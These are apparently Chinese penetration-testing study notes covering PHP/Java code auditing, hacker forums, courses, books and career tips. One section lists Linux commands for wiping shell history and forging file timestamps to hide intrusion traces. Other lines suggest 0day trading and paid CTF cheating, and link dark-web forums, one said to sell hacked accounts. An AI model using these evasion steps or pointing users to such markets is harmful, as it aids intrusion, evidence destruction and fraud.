> // 通用关键词可能会搜到很多文件包含此关键字，如果你不明确目标的情况下，通常优先看最敏感的目录如/admin
>
> **通用关键字**： $_GET $_POST $_REQUEST $_FILES $_SEVER

**追踪执行过程**
通过数据包（F12或burpsuie)中请求头、请求参数、URL等，利用seay搜索这些字符来追踪。追踪一般重点追踪验证函数和接收函数


**想深入理解？**
下个编译器追踪一下debug执行

通过应用及URL地址等分析可能存在xss及包含安全
抓包找到xSS无过滤代码块及文件包含有后缀需绕过代码块
unlink，delfile是php中对应删除的函数
删除数据库安装文件，可以重装数据库。

## JAVAWEB

与php不同是里面有自带一些安全防御的写法比如预编译，代码层级显示不一样；一个javaweb程序可能有多个不同的框架组合而成，具体哪些框架得看开发者要开发什么业务。
以下展示了部分java框架
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718155255896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
与php审计不同，java审计的第一步通常是直接检测过滤器的漏洞，看看过滤器是不是会产生漏网之鱼。

### 基础开发知识

**组件**
 javaWeb中的重要三个组件Filter、servlet、Listening，其中所有的基础框架（spring、springmvc、struts2、mybatis、hibernate、spring boot）都是在这个基础上进行的，而其他功能框架（shiro、spring security、pio、quartz、activity等等）是在基础框架的基础上再使用的，而javaweb中的组件都是配置在web.xml中，其中在启动的顺序中是：
context-param——> listener——>filter——>servlet 

**命名规则**
com:
公司项目，copyright由项目发起的公司所有
包名为com.公司名.项目名.模块名.......
持久层: dao、persist、mapper
实体类: entity、model、bean、javabean、pojo
业务逻辑: service、biz
控制器:controller、servlet、action、web
过滤器:filter
异常:exception
监听器:listener
在不同的框架下一般包的命名规则不同，但大概如上，不同功能的Java文件放在不同的包中,根据Java文件的功能统一安放及命名。
jsp文件是普通的java程序，可以直接读取。jar需要进行反编译才能读取

**框架表达式**
struct 框架对应的表示是ognl
springboot 框架对应的表示是SPEL
这些表达式就像php中的eval能将字符串转换为代码去执行。如果java有框架且网页端有漏洞，通常都采用表达式在网页端进行触发

**框架**
框架版本、拦截器、执行流程是在试图挖0day漏洞需要认真考虑的

### 审计

#### 手动

**查看过滤器（Filter）**
定义了过滤器传入的数据都会经过过滤
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718160648321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

查看过滤配置信息/src/main/webapp/WEB_INF/web.xml
过滤器通常有多个通常包含与漏洞有关和无关的，你只需要留意与漏洞有关的
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718161029543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
三方过滤器和开发员自己写的一般从命名就可以分辨出，分辨出后有利于你快速定位到过滤器的包。过滤器的的实现一个Filter只需要重写init . doFilter 、destroy方法即可，其中过滤逻辑都在doFilter方法中实现。下图展示了一个过滤器的写法
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718161616824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**查看拦截器（interceptor）**
拦截包与过滤包功能是一样的，但区别在于拦截包没有web.xml,网站是采用框架开发的。那么你在看配置文件时就应该对应框架默认配置文件去寻找，另外拦截包的写法也会与web.xml的略有不同，更多情况如果你遇见了请百度。以下给出了常见的xml过滤器命名
struts2配置文件:struts. xml
spring配置文件:applicationcontext. xml
spring MvC 配置文件:spring-mvc.xml
Hibernate配置文件:Hibernate.cfg- xml
Mybaits配置文件:mybatis-config . xml

如果同时拥有过滤器和拦截器是先filter后interceptor。
**查看涉及的第三方包**
看引用的jar包或pom. xml
如下图是看引用的外部包
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718151923925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



#### 工具

**一键代码审计**
Fortify
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718150723281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**IDE**
**全局搜索**
ctrl+shift+F 全局搜索，通常搜索出关键词有可能匹配过多，可以导入新窗口看得更清晰
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718153132565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**引用追踪**
快捷键，ALT+F7 通常能查找出引用，但如果你查找的函数是被放在了jar就找不到了。需要在IDE中先对jar 添加为库才可以看到里面的代码，在载入到项目中才可以搜索到

# 待补充：物理攻击
## wifi
## 

# 待补充：隐藏技术
阻止防御者信息搜集，销毁行程记录，隐藏存留文件。


## 实用工具
该项目旨在以 Pythonic 的方式轻松地与 Microsoft Graph 和 Office 365 进行交互。访问电子邮件、日历、联系人、OneDrive 等。很容易以一种对初学者来说简单而直接的方式进行，对经验丰富的 Python 程序员来说感觉恰到好处。一旦我们攻击进了 Windows 系统，我们就可以在受害者机器上使用 PowerShell 进行 Responder 攻击。工具如下https://github.com/lgandx/Responder



###  日志删除

攻击和入侵很难完全删除痕迹，没有日志记录也是一种特征
即使删除本地日志，在网络设备、安全设备、集中化日志系统中仍有记录
留存的后门包含攻击者的信息
使用的代理或跳板可能会被反向入侵
**windows**
操作日志：3389登录列表、文件访问日志、浏览器日志、系统事件
登录日志：系统安全日志
**linux**
清除历史
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;
kill -9 $$ kill history
history -c
删除 ~/.ssh/known_hosts 中记录
修改文件时间戳
touch –r
删除tmp目录临时文件




# 下一步
## 渗透发展
### 自动化
以前国内外还没有几家AI+渗透的公司，现在已经越来越多了，而开源的项目也有朝着此方向发展的。相信不久后大牛会带我们进入这个时代，一些自动化开源项目如下：
https://github.com/mitre/caldera
## 待整理：个人发展与规划
### 找工作
**面试看重什么**
也可以朝着以下方向做准备
在xx安全论坛投稿过xx篇文章，获得xx元稿费。
在xx众测,提交过xx漏洞，获得过xx元奖金。
有x年以上的Web/App漏洞挖掘、业务逻辑漏洞挖掘经验。
精通xx,xx,xx语言，能独立开发poc和exp。
获取xx张CNVD证书 和 xx CVE编号。
在xx安全会议上进行过xx演讲。

**写简历**
免费简历模板，快速生成个人简历https://www.100chui.com/resume/
****
**刷面试题**
刷面试题
https://www.freebuf.com/jobs
****
**找工作**
各大网站发布得都比较散，要自行点进去一个个看。
脉脉，这个真的不错，超乎意料
拉勾
BOSS直聘
http://www.hackdig.com/?cat-4.htm
https://www.chamd5.org/jobs.aspx
https://www.anquanke.com/job/


### 如何赚钱
#### 靠技术



**src平台**

**接外包**
CTF代打
HW行动面试
0day交易
#### 技术沾边

 **当老师**
给视频加字幕方法https://www.iculture.cc/knowledge/pig=168
**发博客赚钱**
搭建个人博客 https://zhuanlan.zhihu.com/p/102592286
**售卖网课**
**售卖电子书**
售卖国外电子书，这个网站有大量免费国外电子书网站链接 https://freeditorial.com/
### 自学
①不建议：网上有很多关于不实用的渗透技术介绍文章，不要花大量时间去研究漏洞已经濒临灭绝的，即：

1. 漏洞条件苛刻：默认情况下需要网站管理员开启危险服务的(呵呵，想得美)
2. 过于古老：漏洞发生在已经快被淘汰的版本



#### 刷题
**经典**
DVWA
web山羊
实验吧，和bugkuCTF题目要简单一点https://ctf.bugku.com/，适合初学者做


![在这里插入图片描述](https://img-blog.csdnimg.cn/2021050919362733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
国外靶场vulnhub，更贴近实际环境，靶机需要你从扫描开始对其进行漏洞利用。官网地址 https://www.vulnhub.com/


#### 社区

https://www.securityfocus.com/

https://packetstormsecurity.com/

https://cxsecurity.com/

https://shuimugan.com/

360威胁情报中心

开放漏洞情报：
CVE
CX security
NVD
SCAP

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210521223046475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


securitytracker
很不错的社会工程学资源，而且更新也很及时 http://www.20045018.com/
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070118385397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


## 知名机构

穷奇、海莲花这两个APT组织的攻击活动


## 社区

https://www.reddit.com/r/websecurityresearch/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701223121553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

https://www.reddit.com/r/websecurityresearch/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701223216598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
https://twitter.com/albinowax

国际信息系统安全协会这个协作性专业网络通过培训计划、研讨会和职业服务将全球的网络安全专业人员联合起来。ISSA 还为雄心勃勃的专业人士开设了一个研究员计划。
(ISC) 2这家领先的非营利网络安全组织拥有超过 150,000 名专业人士的会员基础。它提供受人尊敬的认证、考试准备资源、职业服务和许多其他福利。
ISACA这个面向企业的组织提供的福利包括仅限会员的招聘会和招聘委员会、国际会议以及 200 多个举办培训研讨会和活动的当地分会。ISACA 提供学生、应届毕业生和专业会员级别。
Comp-TIA另一个受人尊敬的全球网络安全领导者，Comp-TIA 组织提供专业培训计划、继续教育和认证。会员还可以使用专属的职业中心。


一些高质量的免费黑客课程，不过上一次更新是一年前了。http://www.securitytube.net/listing?type=latest&page=2
免费观看 udemy 付费课程 https://freetutorialsudemy.com

很不错的个人博客，为数不多推荐的个人博客，写得很详细，也很全，含黑客的常用技巧https://www.hackingarticles.in

https://www.classcentral.com/subject/cybersecurity?free=true
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210624142258642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

有部分有用文档 http://www.xiaodi8.com/?page=2


**小迪安全**
推荐指数：5
预备技能：一点编程、基础安全知识
整体评价：干货多
[视频很推荐B站小迪8 课程从2020/5/20开始](https://www.bilibili.com/video/BV1JZ4y1c7ro?p=4&spm_id_from=pageDriver)
这些笔记写得粗略简单，没有个人总结，但是我没有找到更好的，就将就着看好了。
笔记已更新到七十二天https://www.cnblogs.com/SnowSec/category/1908585.html?page=2

暗月安全培训,听说不错，还没时间看

1. IT 和网络安全简介
   由Cybrary IT 提供


这个免费的 IT 和网络安全培训课程时长 4 小时 21 分钟，非常适合初学者。培训通过关注 IT 和网络安全的四个学科向学生介绍该行业：

• 系统管理

• 网络工程

• 事件响应和取证

• 攻击性安全和渗透测试

该课程由 Cybrary 的主教练 Ken Underhill 和 FireEye 的高级技术教练 Joe Perry 监督。这些行业专家提供了我们列表中最好的免费在线网络安全课程之一，该课程专门用于帮助那些持观望态度的人决定适合他们的职业道路。学生将发现 Cybrary 平台使用引人入胜的点播视频以合乎逻辑的、用户友好的顺序发展。

费用：免费

证书：是

完成时间： 4小时21分钟

课程：介绍

用户体验：优秀

教学质量：优秀

优点：

•提供证书

•简短而引人入胜

•深入了解该领域每条职业道路的细节

缺点：

•学生必须创建一个帐户才能访问材料

### 黑客组织和官网

thc,开发了hydra等 https://www.thc.org/
 开发了SET等 TrustedSec	https://www.trustedsec.com
 Coalfire 
**Hack Forums:**
http://hackforums.net/

>**Hack Forums** 是目前最为理想的黑客技术学习根据地。该论坛不仅在设计上面向黑客群体，同时也适用于开发人员、博主、游戏开发者、程序员、图形设计师以及网络营销人士。
>2021/5/22访问显示Site Offline；Access denied


https://null-byte.wonderhowto.com

Hackaday

http://hackaday.com/

Hackaday是排名最高的网站之一，提供黑客新闻和各种黑客和网络教程。它还每天发布几篇最新文章，详细描述硬件和软件黑客，以便初学者和黑客了解它。Hackaday还有一个YouTube频道，用于发布项目和操作视频。它为用户提供混合内容，如硬件黑客，信号，计算机网络等。该网站不仅对黑客有用，而且对数字取证和安全研究领域的人也有帮助。


Hackaday

http://hackaday.com/

Hackaday是排名最高的网站之一，提供黑客新闻和各种黑客和网络教程。它还每天发布几篇最新文章，详细描述硬件和软件黑客，以便初学者和黑客了解它。Hackaday还有一个YouTube频道，用于发布项目和操作视频。它为用户提供混合内容，如硬件黑客，信号，计算机网络等。该网站不仅对黑客有用，而且对数字取证和安全研究领域的人也有帮助。



邪恶论坛

https://evilzone.org/

这个黑客论坛可以让你看到关于黑客攻击和破解的讨论。但是，您需要成为此站点上的成员才能查看有关道德黑客攻击的查询和答案。您需要做的就是注册以获取您的ID以获得您的查询答案。您的查询解决方案将由专业黑客回答。记住不要问简单的黑客技巧，这里的社区人非常认真。

HackThisSite

https://www.hackthissite.org/

通常被称为HTS，是一个在线黑客和安全网站，为您提供黑客新闻和黑客教程。它旨在通过一系列挑战，在安全和合法的环境中为用户提供学习和练习基本和高级“黑客”技能的方法。


http://breakthesecurity.cysecurity.org/

该网站的动机以其名称解释。Break The Security提供各种黑客攻击，如黑客新闻，黑客攻击和黑客教程。它还有不同类型的有用课程，可以让你成为一名认证黑客。如果您希望选择黑客和破解的安全性和领域，此站点非常有用。

EC理事会 - CEH道德黑客课程

https://www.eccouncil.org/Certification/certified-ethical-hacker

国际电子商务顾问委员会（EC-Council）是一个由会员支持的专业组织。EC理事会主要作为专业认证机构而闻名。其最着名的认证是认证道德黑客。CEH代表综合道德黑客，提供完整的道德黑客攻击和网络安全培训课程，以学习白帽黑客攻击。你只需要选择黑客课程包并加入训练，成为一名职业道德黑客。本网站可以帮助您获得各种课程，使您成为经过认证的道德黑客。


http://www.hitb.org/

这是一个受欢迎的网站，提供黑客地下的安全新闻和活动。您可以获得有关Microsoft，Apple，Linux，编程等的大量黑客文章。该网站还有一个论坛社区，允许用户讨论黑客技巧。

SecTools

http://sectools.org/

顾名思义，SecTools意味着安全工具。该网站致力于提供有关网络安全的重要技巧，您可以学习如何应对网络安全威胁。它还提供安全工具及其详细说明。


Offensive Community:

http://offensivecommunity.net/

Offensive安全社区基本上属于一个“具备大量黑客教程收集库的黑客论坛”。


Hellbound Hackers:

https://www.hellboundhackers.org/forum/

这里提供与黑客技术相关的各类课程、挑战题目与实现工具。


Hack This Site:

https://www.hackthissite.org/forums/

HackThisSite提供合法而安全的网络安全资源，在这里大家可以通过各类挑战题目测试自己的黑客技能，同时学习到更多与黑客及网络安全相关的知识。简而言之，这是学习黑客技术的最佳站点。


Hack Hound:

http://hackhound.org/forums/

一个拥有大量相关教程及工具的黑客论坛。


Binary Revolution Hacking Forums:

http://www.binrev.com/forums/

提供各类教程、工具以及安全文章。




Crackmes:

http://www.crackmes.de/

在这里，大家可以通过解决各类任务（即crackmes）来测试并提升自己的相关技能水平。


Cracking Forum:

http://www.crackingforum.com/

提供各类最新入侵教程及工具。


Ethical Hacker:

http://www.crackingforum.com/

另一个黑客论坛，提供多种教程及工具资源。


Rohitab:

http://www.rohitab.com/discuss/

Rohitab专注于安全类文章、计算机编程、Web设计以及图形设计等领域。


Enigma Group:

http://www.enigmagroup.org/

Enigma Group提供合法且安全的安全资源，大家可以在这里通过各类培训任务测试并拓展自己的技能水平。


Hack Mac:

http://www.hackmac.org/forum/

提供与Mac平台相关的黑客、入侵以及安全保护教程。


OpenSC:

https://www.opensc.ws/forum.php

Open SC是一个安全研究与开发论坛，且号称是全球知名度最高的恶意软件论坛。


Packet Storm:

https://packetstormsecurity.com/








根据安全公司和网络专家， hackforum，Trojanforge，Mazafaka，dark0de和TheRealDeal进行的几项调查报告，深度网络中的Hacking社区数量非常高。

大多数黑客社区都对公众不开放，因此必须要求邀请才能加入讨论。

在只能通过邀请访问的社区中，有几个黑客论坛，例如流行的Trojanforge，它专门研究恶意软件和代码反转。

这些社区只是不给您需要的第二个人提供会员资格，以向他们表明您对黑客和相关知识有所了解，能够证明自己的价值。 在论坛上，您可以直接听到世界主要黑客组织的声音。目前最好的黑客组织是什么？
匿名论坛http://rhe4faeuhjs4ldc5.onion/。 黑客技巧和聊天，无需注册
0day论坛http://qzbkwswfv5k2oj5d.onion/。 黑客，安全服务教程，需要注册
Ahima http://msydqstlz2kzerdg.onion/。 阅读隐藏和有趣的新闻。
Anarplex http://y5fmhyqdr6r7ddws.onion/。 密码服务和密码破解
Hydra http://hydraf53r77hxxft.onion/一个论坛，您可以在该论坛上讨论有关Darknet的任何主题
NetFlix帐户http://netflixyummrhppw.onion/，他们出售被黑的Netflix帐户。您将需要比特币进行交易。
确保 访问深度网络 是非法的，因此请 务必采取必要的措施 。
[FreeBuf，適合初學者，在這裏可以看到搬运的优质资源](https://www.freebuf.com/articles/)
[安全客，每篇文章的审核都很严格，因而社区质量高](https://www.anquanke.com/post/id/235970)

[书栈网，有免费github原创中文电子书可搜](https://www.bookstack.cn/search/result?wd=%E6%B8%97%E9%80%8F)

[高质量渗透交流活跃社区](http://www.91ri.org/)

[sec_wiki查看一些当下会议总结，更新还算及时](https://www.sec-wiki.com/index.php)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210510030811163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

2014年成立，更新频繁。文章浅显而广。https://www.heibai.org/

[质量高，但更新也不快，文章来源于站长的爬虫](https://www.moonsec.com/)
**自行搜索github项目技巧**
使用github hacking参数，读者请自行修改
```bash
# size:50..200表示项目在50到200kb之间，只能搜索小于384kb项目
hack user:ngadminq stars:>5000 size:50000..200000 createds:>=2021-07-01 pushed:<2000-09-08 

```
注意事项

```bash
# 如果要搜索python开发的 固定写法是amazing language:python而不是language:python。另外几乎任何符号在搜索中都会被忽略
amazing language:python ?##########[]
```

## 期刊

**停更**
https://gitee.com/litengfeiyouxiu_admin/Safety-Magazine
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210505233058247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


## 大会

演习“锁盾”（Locked Shields），每年举办一次
演习“网络风暴”每两年举行一次

Black Hat USA
defcon [Defcon的CTF“世界杯” 是全球最顶级的网络技术攻防竞赛。](https://www.defcon.org/)
OWASP亚洲峰会

## 导航

其实各位大可不必一个个收藏知名网络安全学习的链接或工具，由于黑客覆盖面广大多，有很多更新较为及时的导航链接已经为你做好了大部分寻找资源的工作。
[纳威安全导航](https://navisec.it/)![在这里插入图片描述](https://img-blog.csdnimg.cn/20210509182041213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


## 游戏

### 红蓝对抗
国际叫法是蓝队是防守，红队是攻击
```bash
考

## 图书推荐
**基础**
Web之困
白帽子讲浏览器安全(钱文祥)
Web前端黑客技术揭秘
XSS跨站脚本攻击剖析与防御
SQL注入攻击与防御
《黑客大揭秘：近源渗透测试》
《内网安全防范：渗透测试实战指南》
Kali Linux Revealed: Mastering the Penetration Testing Distribution（难易度：★★☆☆☆）
这是一本有关 Kali Linux 的黑客书籍
The Hackers Playbook 2（难易度：★★★☆☆）
The Hackers Playbook 3（难易度：★★★☆☆）
**中级**
Improving your Penetration Testing Skills（难易度：★★★★☆）
这本书的学习路径专为希望了解漏洞利用并充分利用 Metasploit 框架的安全专业人员、Web 程序员和渗透测试人员而设计。需要对渗透和 Metasploit 测试有所了解，基本的系统管理技能和读取代码的能力也是必不可少的。

Tribe of Hackers Red Team（难易度：★★★★★）
凭借对系统漏洞的深入了解以及纠正安全漏洞的创新解决方案，红队黑客的需求量很大。这本书包括对有影响力的安全专家的启发性访谈，其中包含分享实战经验。

Advanced Penetration Testing: Hacking the World’s Most Secure Networks（难易度：★★★★★）
它涵盖了 ATP（高级渗透测试）的内容。也就是说，它将教给你远超 Kali Linux 工具的技术。你将学习这些工具的工作原理，以及如何从头到尾编写自己的工具。
仅适用于高级安全研究人员。

Hacking Ético. 3ª Edición （难易度：★★☆☆☆）
这本书采用了一种实用而有趣的方法，教你学习网络安全技术，并包含了带有流行操作系统（例如 Windows 和 Kali Linux）的实验室。

Seguridad informática Hacking Ético Conocer el ataque para una mejor defensa (4ta edición)（难易度：★★★☆☆）
这本书的作者介绍了攻击的方法和修复用于进入系统的漏洞的方法。“了解攻击是为了更好的防御”，以攻击的视角来学习网络安全知识。

El libro blanco del Hacker 2ª Edición Actualizada（难易度：★★★☆☆）
这本书包含了必要的攻击性安全技术，基于国际方法和标准，例如 PTES、OWASP、NIST等，来审核（通过渗透测试考试）能力。

Hacking con Metasploit: Advanced Pentesting（难易度：★★★☆☆）
你将学习高级的渗透测试技巧，payload 和模块的开发、如何避免限制性环境、修改 shellcode 等。这些主题将涵盖渗透测试人员在日常真实场景中面临的许多需求，并包含了安全人员当前使用的技术和工具讲解。

Hacking & cracking. Redes inalámbricas WiFi（难易度：★★★☆☆）
以正确的方式评估设备、无线网络和安全协议，以及执行道德规范的破解和黑客入侵。
这本书介绍了无线硬件的一些基本概念，并介绍了无线网络攻击的应用。

Hackear al Hacker. Aprende de los Expertos que Derrotan a los Hackers（难易度：★★★★☆）
这本书的作者在计算机安全领域工作了 27 年以上。
作为一名专业的渗透测试人员，他能够在一小时内成功访问目标服务器以对其进行黑客攻击。这本书的内容都是他的经验之谈，内容丰富，需要一定基础。


《资产探测与主机安全》：知识盒子 资产探测与主机安全：censys、fofa、NSE、Hydra等实用工具教学，体系化学习资产探测，高效辅助漏洞挖掘
《CTF实战特训课程》：知识盒子 CTF实战特训课程：典型套路、题目详解、代码审计、赛事讲解
《新手入门|穿越赛博》：知识盒子 新手入门|穿越赛博：常见安全工具安装与使用，视频教学，截图验证，适合网络安全入门
《主题进阶|前端黑客》：知识盒子 前端迷雾：常见web前端安全漏洞，简单易懂，在线靶场练习，视频演示，通过学习掌握基础前端安全思路
《暗夜契约|Python黑客》：知识盒子 python黑客: 内容涵盖流量分析，Flask模板注入等常见python安全基础与工具开发，需要有一定python基础，内容具有一定学习深度。

《白帽子讲Web安全》

2星

级别：初级

2012年出版，里面讲到常规漏洞XSS


《黑客攻防：实战加密与解密》
两星推荐
级别：初级
出版。本书作者是当时最厉害的黑客，书的内容主要是社会工程学，内容很简单，没有任何技术全是心理学。

《网络安全应急响应技术实战》
三星推荐
级别：初级
2020/8出版。奇安信认证网络安全工程师系列丛书，书的内容主要是防御。

《Web安全攻防渗透测试实战指南》
四星推荐
级别：初级
2018/07出版。国内人写的，注重基础，攻击与防御方法侃侃而来。
《Web Hacking 101》
四星推荐
级别：中级
2016年出版。里面有很多取自于hackone的例子，对于基础的内容比如漏洞介绍讲得很模糊，因而需要读者有一定知识储备。有实战看起来很棒的

《网站渗透测试实务入门》
两星推荐
级别：初级
2020 8月出版。主要覆盖了各类工具，对于想做工具党的网络玩家而言，这书做的总结还行。

《The Complete Guide to Shodan》
《渗透攻击红队百科全书》
三星推荐
级别：高级
这书优点是相对市面上的书更专业和全面，即便冷门的知识也会在书中出现，不适合初学者，里面排版很乱，很多地方就是贴了一长串代码，并不做过多的解释，因为作者假设我们等级很高，眨眼。
《The-Hacker-Playbook-3》
五星推荐
级别：中级
2020 8月出版


## 博客

[在安全界工作十年的大佬，他的文章同步更新在GitHub，獲得3k star；但github已经不在更新了，博客还在更新。最新的更新时间是2020/5月](https://micropoor.blogspot.com/)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210505223047942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


## 如何修成
以下内容请多参考我的推荐链接。我只是如实将大佬的总结整理了一下。

#### 成为什么样的人

1. 任何问题都不应该被解决两次
2. 这个世界充满了迷人的问题等待解决。
3. 无聊和苦工是邪恶的。这种浪费伤害了每个人。
4. 努力工作。如果你崇尚能力，你就会喜欢在自己身上发展它——努力工作和奉献精神将成为一种激烈的游戏，而不是苦差事。这种态度对于成为一名黑客至关重要。
5. 黑客不信任他们部落长老的公然自负，因此明显地达到这种名声是危险的。与其为之奋斗，不如让自己摆正姿势，让它落在你的腿上，然后对自己的地位保持谦虚和亲切。


**跨越瓶颈区**
一旦你开始全职工作，你最初会学到很多东西，但过一段时间你的技术专长就会停滞不前，除非你齐心协力继续学习。拒绝让自己停留在这个障碍是成为网络安全研究人员的最重要的一步。
	
**实践想法**
没有想法太愚蠢。最容易落入的陷阱之一是通过假设一个好主意行不通而不去尝试而毁了它，因为“其他人会已经注意到它”或“这太愚蠢了”。
**打破舒适区**
如果一项技术因困难、繁琐或危险而著称，那么这就是一个急需进一步研究的主题。由于被迫探索远离我的舒适区的话题而反复经历了突破之后，我决定获得新发现的最快途径是积极寻找让你不舒服的话题。很有可能，其他黑客会回避这些话题，从而赋予他们重要的研究潜力
**证明黑客水平**

0day漏洞
许多站点能否被突破，对本身基础漏洞的熟练的配合利用也是一场考验


**考证**
信息安全国际第一认证——CISSP
信息安全国内认证——CISAW
信息安全国内认证——CISP
信息安全技术实操认证新贵——Security+
IT审计人员的必备之证——CISA

**让自己小有名气**

公关对任何人来说都是必要的，所以总尝试在你的圈内出名吧。这些圈内名气都会对职业生涯大有帮助，而薪资也会随着你的名气呈正比增长。
努力奉献自己
写工具

**写书/博客**
开始写博客。千万不能陷入思维的陷阱，你必须是一个专家，然后才能发布任何东西。发布或教学的最佳时间是当您处于学习过程中的时候。所有的信息都是新鲜的，即使你只是写了一堆“如何做这个超级基本的事情”的帖子，有人会遇到它并从中受益。
**本人无写书的经验，以下是copy别人的文字，等我积累经验了，这段文字会修改**
比如一本书全价是70块，在京东等地打7折销售，那么版税是70块的8%，也就是说卖出一本作者能有5.6的收益，当然真实拿到手以后还再要扣税。

    同时也请注意合同的约定是支付稿酬的方式是印刷数还是实际销售数，我和出版社谈的，一般是印刷数量，这有什么差别呢？现在计算机类的图书一般是首印2500册，那么实际拿到手的钱数是 70*8%*2500，当然还要扣税。但如果是按实际销售数量算的话，如果首印才销了1800本的话，那么就得按这个数量算钱了。
    
    现在一本300页的书，定价一般在70左右，按版税8%和2500册算的话，税前收益是14000，税后估计是12000左右，对新手作者的话，300的书至少要写8个月，由此大家可以算下平均每个月的收益，算下来其实每月也就1500的收益，真不多。
    别人的情况我不敢说，但我出书以后，除了稿酬，还有哪些其它的收益呢？
    
    1 在当下和之前的公司面试时，告诉面试官我在相关方面出过书以后，面试官就直接会认为我很资深，帮我省了不少事情。
    
    2 我还在做线下的培训，我就直接拿我最近出的python书做教材了，省得我再备课了。
    
    3 和别人谈项目，能用我的书证明自己的技术实力，如果是第一次和别人打交道，那么这种证明能立杆见效。
    
    尤其是第一点，其实对一些小公司或者是一些外派开发岗而言，如果候选人在这个方面出过书，甚至都有可能免面试直接录取，本人之前面试过一个大公司的外派岗，就得到过这种待遇。 

 我在清华大学出版社、机械工业出版社、北京大学出版社和电子工业出版社出过书，出书流程也比较顺畅，和编辑打交道也比较愉快。我个人无意把国内出版社划分成三六九等，但计算机行业，比较知名的出版社有清华、机工、电子工业和人邮这四家，当然其它出版社在计算机方面也出版过精品书。
 如何同这些知名出版社的编辑直接打交道？

    1 直接到官网，一般官网上都直接有联系方式。
    
    2 你在博客园等地发表文章，会有人找你出书，其中除了图书公司的工作人员外，也有出版社编辑，一般出版社的编辑会直接说明身份，比如我是xx出版社的编辑xx。
    
    3 本人也和些出版社的编辑联系过，大家如果要，我可以给。
    
    那怎么去找图书公司的工作人员？一般不用主动找，你发表若干博文后，他们会主动找你。如果你细问，“您是出版社编辑还是图书公司的编辑”，他们会表明身份，如果你再细问，那么他们可能会站在图书公司的立场上解释出版社和图书公司的差异。
    
    从中大家可以看到，不管你最终是否写成书，但去找知名出版社的编辑，并不难。并且，你找到后，他们还会进一步和你交流选题。

   对一些作者而言，尤其是新手作者，出书不容易，往往是开始几个章节干劲十足，后面发现问题越积越多，外加工作一忙，就不了了之了，或者用1年以上的时间才能完成一本书。对此，我的感受是，一本300到400书的写作周期最长是8个月。为了能在这个时间段里完成一本书，我对应给出的建议是，新手作者可以写案例书，别先写介绍经验类的书
